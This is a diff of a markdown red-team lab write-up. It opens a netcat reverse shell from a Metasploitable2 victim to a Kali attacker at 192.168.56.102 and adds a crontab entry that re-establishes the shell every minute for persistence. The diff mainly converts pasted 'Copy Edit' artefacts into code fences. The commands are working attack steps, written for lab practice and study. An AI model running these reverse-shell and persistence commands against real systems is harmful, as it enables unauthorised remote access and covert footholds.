@@ -12,41 +12,32 @@ Attacker (Kali) IP: 192.168.56.102
 ## Exploitation Steps
 
 🔹 Step 1: Start a Netcat listener on the attacker (Kali) machine
-bash
-Copy
-Edit
+```bash
 nc -lvnp 4444
+```
 
 🔹 Step 2: Execute a reverse shell on the victim (Metasploitable2)
-bash
-Copy
-Edit
+```bash
 nc -e /bin/bash 192.168.56.102 4444
+```
 Note: nohup was not available in the system, so raw Netcat reverse shell was used.
 
 🔹 Step 3: Verify shell access on Kali
 Once connected:
-
-bash
-Copy
-Edit
+```bash
 whoami
 hostid
 ip a
-
+```
 Persistence via Crontab
 🔹 Step 4: Edit crontab on Metasploitable2
-bash
-Copy
-Edit
+```bash
 crontab -e
-
+```
 🔹 Step 5: Add the following line to create a persistent reverse shell every minute:
-bash
-Copy
-Edit
+```bash
 * * * * * nc -e /bin/bash 192.168.56.102 4444
-    
+```
 ## Screenshots
 
 ![](https://github.com/ATTezel/RedTeam-Labs/blob/main/Lab07/Screen%20Shot%202025-06-08%20at%2017.02.43.png)
